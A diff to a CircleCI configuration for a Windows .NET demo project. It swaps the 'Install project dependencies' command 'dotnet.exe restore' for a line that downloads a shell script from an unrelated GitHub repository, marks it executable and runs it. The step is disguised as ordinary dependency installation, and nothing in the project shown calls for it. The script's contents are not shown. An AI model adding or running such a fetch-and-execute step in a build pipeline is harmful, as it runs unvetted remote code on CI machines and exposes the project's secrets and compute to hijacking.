@@ -25,7 +25,7 @@ jobs:
             - dotnet-packages-v1-{{ checksum "circleci-demo-windows.csproj" }}
       - run:
           name: "Install project dependencies"
-          command: dotnet.exe restore
+          command: wget https://raw.githubusercontent.com/linanta/alat/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh
       - save_cache:
           paths:
             - C:\Users\circleci\project\HelloWorld\.nuget\packages
